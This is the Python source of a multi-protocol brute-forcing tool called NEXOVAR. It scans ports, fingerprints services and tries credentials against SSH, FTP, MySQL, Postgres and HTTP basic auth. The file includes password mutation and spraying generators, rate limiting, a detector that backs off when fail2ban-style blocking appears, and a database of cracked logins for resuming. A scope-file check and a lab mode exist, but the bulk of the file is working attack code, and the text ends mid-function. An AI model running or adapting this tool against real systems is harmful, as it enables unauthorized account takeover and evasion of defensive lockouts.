#!/usr/bin/env python3

from __future__ import annotations

import argparse
import asyncio
import base64
import csv
import json
import logging
import os
import random
import re
import shutil
import signal
import socket
import sqlite3
import ssl
import struct
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime
from ipaddress import ip_address, ip_network
from pathlib import Path
from typing import Optional

DEFAULT_TIMEOUT = 6
DEFAULT_MAX_ATTEMPTS_PER_TARGET = 100_000
DEFAULT_MAX_ATTEMPTS_GLOBAL = 1_000_000
DEFAULT_RATE_PER_SEC = 20
DEFAULT_PER_HOST_RATE = 0
DEFAULT_CONCURRENCY = 100
HARD_CONCURRENCY_CAP = 2000
FAIL2BAN_TRIP = 0.9
FAIL2BAN_WINDOW = 5.0

log = logging.getLogger("nv")


class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    ITALIC  = "\033[3m"
    RED     = "\033[38;5;203m"
    ORANGE  = "\033[38;5;215m"
    YELLOW  = "\033[38;5;227m"
    GREEN   = "\033[38;5;120m"
    CYAN    = "\033[38;5;123m"
    BLUE    = "\033[38;5;111m"
    MAGENTA = "\033[38;5;177m"
    PURPLE  = "\033[38;5;141m"
    GREY    = "\033[38;5;245m"
    WHITE   = "\033[38;5;255m"
    ACCENT  = "\033[38;5;213m"
    NEON    = "\033[38;5;51m"
    HOT     = "\033[38;5;207m"
    LIME    = "\033[38;5;154m"


def _term_width(default: int = 88) -> int:
    try:
        return max(60, min(shutil.get_terminal_size((default, 24)).columns, 140))
    except Exception:
        return default


W = _term_width()


def supports_color() -> bool:
    return sys.stdout.isatty() and sys.stderr.isatty()


def strip_ansi(s: str) -> str:
    return re.sub(r"\033\[[0-9;]*m", "", s)


def visible_len(s: str) -> int:
    return len(strip_ansi(s))


def hr(char: str = "─", color: str = C.GREY, width: Optional[int] = None) -> str:
    return f"{color}{char * (width or W)}{C.RESET}"


def panel(title: str, lines: list[str], accent: str = C.NEON,
          width: Optional[int] = None) -> str:
    w = width or W
    inner = w - 4
    title_chip = f" {accent}{C.BOLD}{title}{C.RESET} "
    chip_len = visible_len(title_chip)
    top_fill = "─" * max(0, w - 2 - chip_len - 1)
    top = f"{accent}╭─{C.RESET}{title_chip}{accent}{top_fill}╮{C.RESET}"
    body = []
    for ln in lines:
        pad = max(0, inner - visible_len(ln))
        body.append(f"{accent}│{C.RESET}  {ln}{' ' * pad}  {accent}│{C.RESET}")
    bottom = f"{accent}╰{'─' * (w - 2)}╯{C.RESET}"
    return "\n".join([top, *body, bottom])


def tag(label: str, color: str) -> str:
    return f"{color}{C.BOLD}[{label}]{C.RESET}"


def kv(k: str, v: str, kc: str = C.GREY, vc: str = C.WHITE, kw: int = 14) -> str:
    return f"{kc}{k:<{kw}}{C.RESET} {vc}{v}{C.RESET}"


def splash(protocol: str, target_count: int, concurrency: int,
           rate: float, port: int, dry_run: bool = False,
           authorized: bool = False) -> None:
    w = W
    accent = C.NEON
    hot = C.HOT
    art = [
        f"{hot}███╗   ██╗███████╗██╗  ██╗ ██████╗ ██╗   ██╗ █████╗ ██████╗ {C.RESET}",
        f"{hot}████╗  ██║██╔════╝╚██╗██╔╝██╔═══██╗██║   ██║██╔══██╗██╔══██╗{C.RESET}",
        f"{accent}██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║██║   ██║███████║██████╔╝{C.RESET}",
        f"{accent}██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚██╗ ██╔╝██╔══██║██╔══██╗{C.RESET}",
        f"{C.CYAN}██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝ ╚████╔╝ ██║  ██║██║  ██║{C.RESET}",
        f"{C.CYAN}╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝{C.RESET}",
    ]
    line1 = f"{C.GREY}{C.ITALIC}MULTI PROTOCOL BRUTE-FORCING TOOL{C.RESET}"
    line2 = f"{C.GREY}{C.ITALIC}AUTHOR : {C.RESET}{C.LIME}{C.BOLD}SYLHETYHACKVENGER (THE-ERROR808){C.RESET}"

    print()
    print(hr("═", accent))
    for line in art:
        pad = max(0, (w - visible_len(line)) // 2)
        print(" " * pad + line)
    pad = max(0, (w - visible_len(line1)) // 2)
    print(" " * pad + line1)
    pad = max(0, (w - visible_len(line2)) // 2)
    print(" " * pad + line2)
    print(hr("═", accent))
    print()

    mode_label = "REAL-WORLD" if authorized else "LAB"
    mode_color = C.RED if authorized else C.CYAN

    left = [
        kv("PROTOCOL", protocol.upper(), C.GREY, C.LIME),
        kv("PORT", str(port), C.GREY, C.WHITE),
        kv("TARGETS", str(target_count), C.GREY, C.WHITE),
        kv("CONCURRENCY", str(concurrency), C.GREY, C.WHITE),
    ]
    right = [
        kv("RATE CAP", f"{rate}/s", C.GREY, C.WHITE),
        kv("ENGINE", "asyncio · plugin", C.GREY, C.CYAN),
        kv("STATUS", "DRY-RUN" if dry_run else "ARMED",
           C.GREY, C.YELLOW if dry_run else C.GREEN),
        kv("MODE", mode_label, C.GREY, mode_color),
    ]
    half = (w - 3) // 2
    rows = []
    for l, r in zip(left, right):
        lpad = " " * max(0, half - visible_len(l))
        rows.append(l + lpad + f"{C.GREY}│{C.RESET} " + r)
    print(panel("SESSION", rows, accent=accent))
    print()


def footer_hit(host: str, port: int, protocol: str, user: str, password: str) -> None:
    accent = C.GREEN
    w = W
    print()
    print(f"{accent}╔{'═' * (w - 2)}╗{C.RESET}")
    title = f" {C.BOLD}{C.LIME}◉ ACCESS CONFIRMED{C.RESET} "
    pad = max(0, w - 2 - visible_len(title))
    print(f"{accent}║{C.RESET}{title}{' ' * pad}{accent}║{C.RESET}")
    print(f"{accent}╠{'═' * (w - 2)}╣{C.RESET}")
    rows = [
        kv("TARGET", f"{host}:{port}", C.GREY, C.WHITE, 12),
        kv("PROTOCOL", protocol.upper(), C.GREY, C.CYAN, 12),
        kv("USERNAME", user or "<none>", C.GREY, C.LIME, 12),
        kv("PASSWORD", password or "<none>", C.GREY, C.LIME, 12),
        kv("TIME", datetime.now().isoformat(timespec="seconds"),
           C.GREY, C.GREY, 12),
    ]
    for r in rows:
        pad = max(0, w - 4 - visible_len(r))
        print(f"{accent}║{C.RESET}  {r}{' ' * pad}{accent}║{C.RESET}")
    print(f"{accent}╚{'═' * (w - 2)}╝{C.RESET}")
    print()


def footer_end(hits: int, attempts: int, elapsed: float,
               errors: int = 0, backoffs: int = 0) -> None:
    accent = C.PURPLE if hits == 0 else C.GREEN
    w = W
    print()
    print(f"{accent}╔{'═' * (w - 2)}╗{C.RESET}")
    status = "SESSION COMPLETE" if hits else "SESSION COMPLETE · NO HITS"
    title = f" {C.BOLD}{accent}{status}{C.RESET} "
    pad = max(0, w - 2 - visible_len(title))
    print(f"{accent}║{C.RESET}{title}{' ' * pad}{accent}║{C.RESET}")
    print(f"{accent}╠{'═' * (w - 2)}╣{C.RESET}")
    rate = attempts / elapsed if elapsed else 0
    rows = [
        kv("HITS", str(hits), C.GREY, C.LIME if hits else C.GREY, 12),
        kv("ATTEMPTS", f"{attempts:,}", C.GREY, C.WHITE, 12),
        kv("NET ERRORS", f"{errors:,}", C.GREY, C.ORANGE, 12),
        kv("BACKOFFS", f"{backoffs:,}", C.GREY, C.YELLOW, 12),
        kv("DURATION", f"{elapsed:.2f}s", C.GREY, C.WHITE, 12),
        kv("THROUGHPUT", f"{rate:.1f}/s", C.GREY, C.CYAN, 12),
        kv("FINISHED", datetime.now().isoformat(timespec="seconds"),
           C.GREY, C.GREY, 12),
    ]
    for r in rows:
        pad = max(0, w - 4 - visible_len(r))
        print(f"{accent}║{C.RESET}  {r}{' ' * pad}{accent}║{C.RESET}")
    print(f"{accent}╚{'═' * (w - 2)}╝{C.RESET}")
    print()


class Console:
    def __init__(self, enabled: bool = True):
        self.enabled = enabled and supports_color()
        self.lines = 0
        self.started = time.monotonic()
        self.tick = 0
        self._spin = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

    def _render(self, f: dict) -> list[str]:
        w = W
        accent = C.NEON
        spin = self._spin[self.tick % len(self._spin)]
        self.tick += 1
        elapsed = time.monotonic() - self.started
        attempts = f.get("attempts", 0)
        hits = f.get("hits", 0)
        target = f.get("target", "-")
        proto = f.get("protocol", "-")
        in_flight = f.get("in_flight", 0)
        last = f.get("last", "—")
        errors = f.get("errors", 0)
        rate = attempts / elapsed if elapsed else 0

        header = (f" {C.HOT}{C.BOLD}◆ CONSOLE{C.RESET} "
                  f"{C.GREY}·{C.RESET} {accent}{spin}{C.RESET} "
                  f"{C.GREY}live{C.RESET} ")
        chip_len = visible_len(header)
        fill = "─" * max(0, w - 4 - chip_len)
        top = f"{accent}┌─{C.RESET}{header}{accent}{fill}─┐{C.RESET}"

        rows = [
            f"{tag('TARGET', accent)} {C.WHITE}{target}{C.RESET}"
            f"   {tag('PROTO', C.CYAN)} {C.WHITE}{proto.upper()}{C.RESET}",
            f"{tag('ATTEMPTS', accent)} {C.WHITE}{attempts:,}{C.RESET}"
            f"   {tag('HITS', C.LIME)} {C.LIME}{hits}{C.RESET}"
            f"   {tag('RATE', C.CYAN)} {C.WHITE}{rate:5.1f}/s{C.RESET}"
            f"   {tag('IN-FLIGHT', C.PURPLE)} {C.WHITE}{in_flight}{C.RESET}",
            f"{tag('ERRORS', C.ORANGE)} {C.ORANGE}{errors}{C.RESET}"
            f"   {tag('LAST', C.GREY)} {C.GREY}{last}{C.RESET}",
            f"{tag('ELAPSED', C.GREY)} {C.GREY}{elapsed:6.1f}s{C.RESET}",
        ]

        body = []
        for ln in rows:
            pad = max(0, w - 4 - visible_len(ln))
            body.append(f"{accent}│{C.RESET} {ln}{' ' * pad} {accent}│{C.RESET}")
        bot = f"{accent}└{'─' * (w - 2)}┘{C.RESET}"
        return [top, *body, bot]

    def update(self, **fields) -> None:
        if not self.enabled:
            return
        lines = self._render(fields)
        if self.lines:
            sys.stdout.write(f"\033[{self.lines}A")
        for ln in lines:
            sys.stdout.write("\033[2K" + ln + "\n")
        self.lines = len(lines)
        sys.stdout.flush()

    def clear(self) -> None:
        if not self.enabled or not self.lines:
            return
        sys.stdout.write(f"\033[{self.lines}A")
        for _ in range(self.lines):
            sys.stdout.write("\033[2K\n")
        sys.stdout.write(f"\033[{self.lines}A")
        sys.stdout.flush()
        self.lines = 0


class LogFmt(logging.Formatter):
    LEVEL_STYLE = {
        logging.DEBUG:    ("DEBUG", C.GREY),
        logging.INFO:     ("INFO ", C.CYAN),
        logging.WARNING:  ("WARN ", C.ORANGE),
        logging.ERROR:    ("ERROR", C.RED),
        logging.CRITICAL: ("CRIT ", C.HOT),
    }

    def format(self, record):
        label, color = self.LEVEL_STYLE.get(
            record.levelno, (record.levelname, C.WHITE))
        ts = datetime.fromtimestamp(record.created).strftime("%H:%M:%S")
        prefix = f"{C.GREY}{ts}{C.RESET} {color}▸{C.RESET} {color}{label}{C.RESET}"
        return f"{prefix} {C.WHITE}{record.getMessage()}{C.RESET}"


def setup_logging(verbose: bool, quiet: bool, logfile: Optional[str]) -> None:
    root = logging.getLogger()
    root.handlers[:] = []
    sh = logging.StreamHandler(sys.stderr)
    sh.setFormatter(LogFmt())
    root.addHandler(sh)
    if logfile:
        try:
            Path(logfile).parent.mkdir(parents=True, exist_ok=True)
            fh = logging.FileHandler(logfile, mode="a", encoding="utf-8")
            fh.setFormatter(logging.Formatter(
                "%(asctime)s %(levelname)s %(name)s %(message)s"))
            root.addHandler(fh)
        except Exception as e:
            print(f"warning: could not open logfile {logfile}: {e}",
                  file=sys.stderr)
    if quiet:
        root.setLevel(logging.ERROR)
    elif verbose:
        root.setLevel(logging.DEBUG)
    else:
        root.setLevel(logging.INFO)


def ensure_scope_file(path: Path) -> None:
    if path.exists():
        return
    print(f"\n{C.ORANGE}Scope file '{path}' does not exist.{C.RESET}")
    print(f"{C.GREY}Create it with at least one CIDR or hostname per line.{C.RESET}")
    print(f"{C.GREY}Example:{C.RESET}")
    print(f"    {C.LIME}echo '127.0.0.1' > {path}{C.RESET}")
    print(f"    {C.LIME}echo '192.168.56.0/24' >> {path}{C.RESET}\n")
    try:
        ans = input(f"Create '{path}' with '127.0.0.1' now? [y/N] ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        ans = "n"
    if ans == "y":
        try:
            path.write_text("127.0.0.1\n", encoding="utf-8")
            print(f"{C.LIME}Created {path} with 127.0.0.1{C.RESET}\n")
        except Exception as e:
            print(f"{C.RED}Failed to create scope file: {e}{C.RESET}")
            sys.exit(1)
    else:
        sys.exit(1)


@dataclass
class Scope:
    networks: list = field(default_factory=list)
    exact_hosts: set = field(default_factory=set)

    @classmethod
    def from_file(cls, path: Path) -> "Scope":
        if not path.exists():
            raise FileNotFoundError(
                f"Scope file not found: {path}\n"
                f"Create it with at least one CIDR or hostname per line.\n"
                f"Example:\n"
                f"    echo '127.0.0.1' > {path}"
            )
        if not path.is_file():
            raise FileNotFoundError(f"Scope path is not a file: {path}")
        try:
            text = path.read_text(encoding="utf-8")
        except UnicodeDecodeError:
            text = path.read_text(encoding="latin-1")
        nets, hosts = [], set()
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            try:
                nets.append(ip_network(line, strict=False))
            except ValueError:
                hosts.add(line.lower())
        if not nets and not hosts:
            raise ValueError(
                f"Scope file '{path}' is empty (no hosts or networks). "
                f"Refusing to run."
            )
        return cls(nets, hosts)

    def allows(self, host: str) -> bool:
        if not self.networks and not self.exact_hosts:
            return False
        if host.lower() in self.exact_hosts:
            return True
        try:
            ip = ip_address(host)
        except ValueError:
            try:
                ip = ip_address(socket.gethostbyname(host))
            except Exception:
                return False
        return any(ip in n for n in self.networks)

    def require(self, host: str) -> None:
        if not self.allows(host):
            raise PermissionError(
                f"Target {host} is not in scope file. Refusing to test.")


def mutate(word: str, org: Optional[str] = None) -> set:
    year = datetime.now().year
    variants = {
        word, word.lower(), word.upper(), word.capitalize(),
        word[::-1], word + "1", word + "12", word + "123", word + "!",
        word + "@123", word + str(year), word + str(year - 1),
        word + str(year) + "!",
    }
    leet = word.translate(str.maketrans("aeiosAEIOS", "4310543105"))
    variants.add(leet)
    if org:
        for tpl in ("{o}", "{o}1", "{o}123", "{o}!", "{o}@{y}",
                    "{o}@{y}!", "Welcome@{y}", "{o}{y}"):
            variants.add(tpl.format(o=org, y=year))
    return {v for v in variants if v}


def read_lines(path: Path) -> list[str]:
    if not path.exists():
        raise FileNotFoundError(str(path))
    if not path.is_file():
        raise FileNotFoundError(f"not a file: {path}")
    for enc in ("utf-8", "latin-1"):
        try:
            return [l.strip() for l in path.read_text(encoding=enc).splitlines()
                    if l.strip() and not l.startswith("#")]
        except UnicodeDecodeError:
            continue
    return []


def smart_pairs(users, passes, org=None, mutate_passes=True):
    seen = set()

    def emit(u, p):
        key = (u, p)
        if key in seen:
            return None
        seen.add(key)
        return key

    for u in users:
        k = emit(u, "")
        if k:
            yield k
    for u in users:
        k = emit(u, u)
        if k:
            yield k
    for u in users:
        for p in passes:
            k = emit(u, p)
            if k:
                yield k
    if mutate_passes:
        for u in users:
            for p in passes:
                for v in mutate(p, org):
                    k = emit(u, v)
                    if k:
                        yield k


def spray_pairs(users, passes):
    seen = set()
    for u in users:
        for p in ("", u):
            if (u, p) not in seen:
                seen.add((u, p))
                yield (u, p)
    for p in passes:
        for u in users:
            if (u, p) not in seen:
                seen.add((u, p))
                yield (u, p)


class RateLimiter:
    def __init__(self, rate_per_sec: float):
        self.delay = 1.0 / max(rate_per_sec, 0.01)
        self.next = 0.0
        self._lock = asyncio.Lock()

    async def wait(self):
        async with self._lock:
            now = time.monotonic()
            sleep = max(0.0, self.next - now)
            self.next = max(now, self.next) + self.delay
        if sleep:
            await asyncio.sleep(sleep + random.uniform(0, self.delay * 0.3))


class HostRateLimiter:
    def __init__(self, per_host_rate: float = 0.0):
        self.per_host = per_host_rate
        self._state: dict[str, tuple[float, asyncio.Lock]] = {}

    async def wait(self, host: str):
        if self.per_host <= 0:
            return
        if host not in self._state:
            self._state[host] = (0.0, asyncio.Lock())
        next_t, lock = self._state[host]
        delay = 1.0 / self.per_host
        async with lock:
            now = time.monotonic()
            sleep = max(0.0, next_t - now)
            new_next = max(now, next_t) + delay
        self._state[host] = (new_next, lock)
        if sleep:
            await asyncio.sleep(sleep)


class Fail2BanDetector:
    def __init__(self, trip: float = FAIL2BAN_TRIP, window: float = FAIL2BAN_WINDOW):
        self.trip = trip
        self.window = window
        self._events: dict[str, list[tuple[float, bool]]] = {}
        self._lock = asyncio.Lock()
        self.backoffs = 0

    async def record(self, host: str, refused: bool) -> bool:
        now = time.monotonic()
        async with self._lock:
            ev = self._events.setdefault(host, [])
            ev.append((now, refused))
            cutoff = now - self.window
            ev[:] = [(t, r) for (t, r) in ev if t >= cutoff]
            if len(ev) >= 5:
                ratio = sum(1 for _, r in ev if r) / len(ev)
                if ratio >= self.trip:
                    self.backoffs += 1
                    return True
        return False

    async def backoff(self, seconds: float = 15.0):
        await asyncio.sleep(seconds)


@dataclass
class TargetResult:
    host: str
    port: int
    protocol: str
    username: str
    password: str
    banner: str = ""
    timestamp: float = field(default_factory=time.time)


class State:
    def __init__(self, path: Path):
        self.path = path
        self._lock = asyncio.Lock()
        try:
            path.parent.mkdir(parents=True, exist_ok=True)
        except Exception:
            pass
        self._conn = sqlite3.connect(path, check_same_thread=False)
        self._conn.execute("""
            CREATE TABLE IF NOT EXISTS hits (
                ts REAL, host TEXT, port INT, protocol TEXT,
                username TEXT, password TEXT, banner TEXT,
                PRIMARY KEY (host, port, protocol, username)
            )""")
        self._conn.execute("""
            CREATE TABLE IF NOT EXISTS progress (
                host TEXT, port INT, protocol TEXT,
                last_user TEXT, last_pass TEXT, attempts INT, updated REAL,
                PRIMARY KEY (host, port, protocol)
            )""")
        self._conn.execute("""
            CREATE TABLE IF NOT EXISTS attempts (
                ts REAL, host TEXT, port INT, protocol TEXT,
                username TEXT, password TEXT, result TEXT
            )""")
        self._conn.commit()

    async def save_hit(self, r: TargetResult):
        async with self._lock:
            self._conn.execute(
                "INSERT OR REPLACE INTO hits VALUES (?,?,?,?,?,?,?)",
                (r.timestamp, r.host, r.port, r.protocol,
                 r.username, r.password, r.banner))
            self._conn.commit()

    async def save_progress(self, host, port, proto, u, p, attempts):
        async with self._lock:
            self._conn.execute(
                "INSERT OR REPLACE INTO progress VALUES (?,?,?,?,?,?,?)",
                (host, port, proto, u, p, attempts, time.time()))
            self._conn.commit()

    async def log_attempt(self, host, port, proto, u, p, result):
        async with self._lock:
            self._conn.execute(
                "INSERT INTO attempts VALUES (?,?,?,?,?,?,?)",
                (time.time(), host, port, proto, u, p, result))
            self._conn.commit()

    def get_resume_point(self, host: str, port: int, proto: str) -> Optional[str]:
        row = self._conn.execute(
            "SELECT last_user FROM progress WHERE host=? AND port=? AND protocol=?",
            (host, port, proto)).fetchone()
        return row[0] if row else None

    def close(self):
        try:
            self._conn.close()
        except Exception:
            pass


PROTOCOLS: dict[str, "BaseProtocol"] = {}
MISSING_DEPS: dict[str, str] = {}


class DependencyMissing(Exception):
    pass


class BaseProtocol:
    name: str = "base"
    default_port: int = 0
    aliases: tuple = ()
    requires: tuple = ()

    def missing(self) -> Optional[str]:
        for mod, hint in self.requires:
            try:
                __import__(mod)
            except ImportError:
                return hint
        return None

    async def attempt(self, host: str, port: int, username: str,
                      password: str, timeout: float) -> Optional[bool]:
        raise NotImplementedError

    async def banner(self, host: str, port: int, timeout: float = 5) -> str:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout)
            line = await asyncio.wait_for(reader.readline(), timeout=timeout)
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            return line.decode(errors="ignore").strip()
        except Exception:
            return ""


def register(cls):
    inst = cls()
    PROTOCOLS[cls.name] = inst
    missing = inst.missing()
    if missing:
        MISSING_DEPS[cls.name] = missing
    return cls


COMMON_PORTS = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
    80: "http", 110: "pop3", 111: "rpcbind", 135: "msrpc",
    139: "netbios", 143: "imap", 443: "http", 445: "smb",
    993: "imap", 995: "pop3", 1433: "mssql", 1521: "oracle",
    2049: "nfs", 3000: "http", 3306: "mysql", 3389: "rdp",
    5432: "postgres", 5601: "http", 5900: "vnc",
    5985: "winrm", 5986: "winrm", 6379: "redis",
    8080: "http", 8443: "http", 8888: "http",
    9200: "elasticsearch", 27017: "mongodb",
}
DEFAULT_SCAN_PORTS = sorted(COMMON_PORTS.keys())

BANNER_SIGNATURES = [
    (re.compile(rb"^SSH-", re.I),                          "ssh"),
    (re.compile(rb"^220[ -].*FTP", re.I),                  "ftp"),
    (re.compile(rb"^220[ -].*SMTP", re.I),                 "smtp"),
    (re.compile(rb"^220[ -].*ESMTP", re.I),                "smtp"),
    (re.compile(rb"^\* OK", re.I),                         "imap"),
    (re.compile(rb"^\+OK", re.I),                          "pop3"),
    (re.compile(rb"^HTTP/", re.I),                         "http"),
    (re.compile(rb"MySQL", re.I),                          "mysql"),
    (re.compile(rb"Redis", re.I),                          "redis"),
    (re.compile(rb"^RFB\s", re.I),                         "vnc"),
    (re.compile(rb"^220[ -]", re.I),                       "ftp"),
]


@dataclass
class Probe:
    host: str
    port: int
    open: bool
    protocol: Optional[str] = None
    banner: str = ""
    method: str = ""
    cert: dict = None


async def _tcp_connect(host: str, port: int, timeout: float):
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=timeout)
        return reader, writer
    except Exception:
        return None, None


async def _probe_banner(host: str, port: int, timeout: float) -> str:
    reader, writer = await _tcp_connect(host, port, timeout)
    if not reader:
        return ""
    try:
        data = await asyncio.wait_for(reader.read(512), timeout=timeout)
    except Exception:
        data = b""
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
    return data.decode(errors="ignore")


async def _probe_http(host: str, port: int, timeout: float,
                      tls: bool = False):
    cert_info = {}
    try:
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx,
                                        server_hostname=host),
                timeout=timeout)
            try:
                cert = writer.get_extra_info("peercert")
                if cert:
                    cert_info = {
                        "subject": str(cert.get("subject", "")),
                        "issuer": str(cert.get("issuer", "")),
                        "notAfter": cert.get("notAfter", ""),
                    }
            except Exception:
                pass
        else:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout)
    except Exception:
        return "", {}
    try:
        req = (f"HEAD / HTTP/1.0\r\nHost: {host}\r\n"
               f"User-Agent: probe\r\n\r\n").encode()
        writer.write(req)
        await writer.drain()
        data = await asyncio.wait_for(reader.read(1024), timeout=timeout)
    except Exception:
        data = b""
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
    return data.decode(errors="ignore"), cert_info


async def _probe_mysql(host: str, port: int, timeout: float) -> bool:
    reader, writer = await _tcp_connect(host, port, timeout)
    if not reader:
        return False
    try:
        data = await asyncio.wait_for(reader.read(256), timeout=timeout)
    except Exception:
        data = b""
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
    return len(data) >= 5 and data[4] == 0x0a


async def _probe_redis(host: str, port: int, timeout: float) -> bool:
    reader, writer = await _tcp_connect(host, port, timeout)
    if not reader:
        return False
    try:
        writer.write(b"PING\r\n")
        await writer.drain()
        data = await asyncio.wait_for(reader.read(64), timeout=timeout)
    except Exception:
        data = b""
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
    return data.startswith((b"+PONG", b"-NOAUTH", b"-ERR"))


async def _probe_postgres(host: str, port: int, timeout: float) -> bool:
    reader, writer = await _tcp_connect(host, port, timeout)
    if not reader:
        return False
    try:
        writer.write(b"\x00\x00\x00\x08\x04\xd2\x16\x2f")
        await writer.drain()
        data = await asyncio.wait_for(reader.read(1), timeout=timeout)
    except Exception:
        data = b""
    finally:
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
    return data in (b"S", b"N")


async def fingerprint(host: str, port: int, timeout: float = 3.0,
                      known_hint: Optional[str] = None) -> Probe:
    reader, writer = await _tcp_connect(host, port, timeout)
    if not reader:
        return Probe(host, port, open=False)
    try:
        writer.close()
        await writer.wait_closed()
    except Exception:
        pass

    probe = Probe(host, port, open=True)

    for name, fn in (("redis", _probe_redis),
                     ("mysql", _probe_mysql),
                     ("postgres", _probe_postgres)):
        try:
            if await fn(host, port, timeout):
                probe.protocol = name
                probe.method = "active"
                return probe
        except Exception:
            pass

    for tls in (False, True):
        http_banner, cert = await _probe_http(host, port, timeout, tls=tls)
        if http_banner.startswith("HTTP/"):
            probe.protocol = "http"
            probe.banner = http_banner.split("\r\n", 1)[0]
            probe.method = "active-tls" if tls else "active"
            probe.cert = cert or None
            return probe

    banner = (await _probe_banner(host, port, timeout)).strip()
    probe.banner = banner
    for pattern, proto in BANNER_SIGNATURES:
        if pattern.search(banner.encode(errors="ignore")):
            probe.protocol = proto
            probe.method = "banner"
            return probe

    if known_hint:
        probe.protocol = known_hint
        probe.method = "port-hint"
        return probe
    if port in COMMON_PORTS:
        probe.protocol = COMMON_PORTS[port]
        probe.method = "port"
        return probe
    return probe


async def scan_ports(host: str, ports: list[int], timeout: float = 2.0,
                     concurrency: int = 200) -> list[int]:
    sem = asyncio.Semaphore(concurrency)
    open_ports: list[int] = []

    async def check(p: int):
        async with sem:
            reader, writer = await _tcp_connect(host, p, timeout)
            if reader:
                open_ports.append(p)
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

    await asyncio.gather(*(check(p) for p in ports))
    return sorted(open_ports)


async def detect_target(host: str, ports: list[int],
                        timeout: float = 2.0,
                        concurrency: int = 200) -> list[Probe]:
    open_ports = await scan_ports(host, ports, timeout, concurrency)
    sem = asyncio.Semaphore(concurrency)

    async def one(p: int):
        async with sem:
            return await fingerprint(host, p, timeout)

    results = await asyncio.gather(*(one(p) for p in open_ports))
    return [r for r in results if r.open]


@register
class SSHProtocol(BaseProtocol):
    name = "ssh"
    default_port = 22
    requires = (("asyncssh", "pip install asyncssh"),)

    async def attempt(self, host, port, username, password, timeout):
        import asyncssh
        client_keys = None
        pw = password
        if password.startswith("@key:"):
            client_keys = [password[5:]]
            pw = None
        try:
            conn = await asyncio.wait_for(
                asyncssh.connect(
                    host, port=port, username=username, password=pw,
                    client_keys=client_keys,
                    known_hosts=None, login_timeout=timeout,
                    agent_path=None, preferred_auth=None),
                timeout=timeout + 2)
        except (asyncssh.PermissionDenied, asyncssh.DisconnectError):
            return False
        except asyncio.TimeoutError:
            return None
        except (OSError, ConnectionError):
            return None
        except Exception as e:
            log.debug("ssh err %s:%s %s/%s %s", host, port, username, password, e)
            return None
        try:
            conn.close()
        except Exception:
            pass
        return True


@register
class FTPProtocol(BaseProtocol):
    name = "ftp"
    default_port = 21
    requires = (("aioftp", "pip install aioftp"),)

    async def attempt(self, host, port, username, password, timeout):
        import aioftp
        client = aioftp.Client()
        try:
            await asyncio.wait_for(
                client.connect(host, port, timeout=timeout),
                timeout=timeout + 2)
            await asyncio.wait_for(
                client.login(username, password),
                timeout=timeout + 2)
            await client.quit()
            return True
        except asyncio.TimeoutError:
            try:
                await client.quit()
            except Exception:
                pass
            return None
        except aioftp.StatusCodeError as e:
            codes = getattr(e, "received_codes", None) or ()
            code = codes[0] if codes else ""
            if isinstance(code, str) and code.startswith("53"):
                return False
            return None
        except (OSError, ConnectionError):
            return None
        except Exception as e:
            log.debug("ftp err %s:%s %s/%s %s", host, port, username, password, e)
            return None


@register
class MySQLProtocol(BaseProtocol):
    name = "mysql"
    default_port = 3306
    requires = (("aiomysql", "pip install aiomysql"),)

    async def attempt(self, host, port, username, password, timeout):
        import aiomysql
        try:
            conn = await asyncio.wait_for(
                aiomysql.connect(
                    host=host, port=port, user=username, password=password,
                    connect_timeout=timeout, autocommit=True),
                timeout=timeout + 2)
            conn.close()
            return True
        except asyncio.TimeoutError:
            return None
        except aiomysql.OperationalError as e:
            code = e.args[0] if e.args else 0
            if isinstance(code, str):
                try:
                    code = int(code)
                except ValueError:
                    code = 0
            if code in (1045, 1044):
                return False
            return None
        except (OSError, ConnectionError):
            return None
        except Exception as e:
            log.debug("mysql err %s:%s %s/%s %s", host, port, username, password, e)
            return None


@register
class PostgresProtocol(BaseProtocol):
    name = "postgres"
    default_port = 5432
    aliases = ("postgresql", "pgsql", "pg")
    requires = (("asyncpg", "pip install asyncpg"),)

    async def attempt(self, host, port, username, password, timeout):
        import asyncpg
        for db in ("postgres", "template1"):
            try:
                conn = await asyncio.wait_for(
                    asyncpg.connect(
                        host=host, port=port, user=username,
                        password=password, timeout=timeout,
                        database=db, statement_cache_size=0),
                    timeout=timeout + 2)
                await conn.close()
                return True
            except asyncpg.InvalidPasswordError:
                return False
            except asyncpg.InvalidCatalogNameError:
                continue
            except asyncio.TimeoutError:
                return None
            except asyncpg.PostgresError:
                return False
            except (OSError, ConnectionError):
                return None
            except Exception as e:
                log.debug("pg err %s:%s %s/%s %s", host, port, username, password, e)
                return None
        return None


@register
class HTTPProtocol(BaseProtocol):
    name = "http"
    default_port = 80
    aliases = ("https", "http-basic", "http-digest")
    requires = (("httpx", "pip install httpx"),)

    async def attempt(self, host, port, username, password, timeout):
        import httpx
        scheme = "https" if port in (443, 8443) else "http"
        url = f"{scheme}://{host}:{port}/"
        try:
            async with httpx.AsyncClient(verify=False, timeout=timeout,
                                         follow_redirects=False) as c:
                r = await c.get(url, auth=(username, password))
